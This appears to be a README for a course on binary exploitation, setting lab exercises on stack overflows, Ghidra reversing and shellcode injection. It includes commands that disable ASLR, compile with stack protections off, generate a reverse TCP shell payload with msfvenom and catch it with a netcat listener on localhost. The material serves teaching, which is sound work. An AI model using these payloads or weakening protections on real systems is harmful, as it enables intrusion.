# Introduction : Binary exploitation

Hey u all,  
You will find in this repository some documentation along with exercices.   
You don't need to do it in order.  

Do not hesitate to ask me your questions.  


## Setup

- Download and create a 64-bit linux based VM (debian is preferred) 
- Install gdb-peda 
- Install python3
- Install pwntools (using pip3 or pip)
- Install Metasploit (wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run)

- Disable ASLR -> ```echo 0 | sudo tee /proc/sys/kernel/randomize_va_space```

## Compilation


```bash
gcc -g -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -m32  <exercise.c>  -o <exercice> 
```

### Explanations
 
- -m32: compile as a x32 binary
- -fno-stack-protector: Disable the stack exploitation mechanisms.
- -z execstack: The stack is executable  
- -mpreferred-stack-boundary=2: Align the stack 4-bytes

## Exercises

**Homework: Please create an unique markdown report and export it to pdf.**

### Exercise 1: Simple redirection

The goal is to get a bash shell.   
You will need to control EIP and redirect the execution flow to the shell() function.
**If the exploit is successful, but you don't have any shell, try with /bin/sh shell**

#### Reporting requirements
- Crash screenshot
- Controlling the offset
- EIP = shell() address
- Whoami command on your popped shell.



### Exercice 2: Is there another very very secret way ?

Using Ghidra, decompile the fuzz_me program.
Find the master secret password.

#### Reporting requirements
- Screenshot of your program on Ghidra
- What is the hidden functionnality ? what is its purpose?  
**Depending on your architecture it may not work when you type the password, don't worry, just screenshot it**


### Exercise 3: Jumping to your shellcode

Exploit the fuzz_me program. You will have to find the place where you can inject your payload.
Use this command to generate the  shellcode :
msfvenom -p linux/x86/shell_reverse_tcp -b '\x00\x0a\x0b' LHOST=127.0.0.1 LPORT=55555 -f python  
You will obtain a reverse using the netcat command listening on this port : nc -lvp 55555  

#### Reporting requirements
- Crash screenshot
- Controlling the offset
- Find a "jmp esp"
- Jumping to a nop-slide
- Jumping to your shellcode
- The reverse shell appears
- Your exploit_fuzz_me.py script





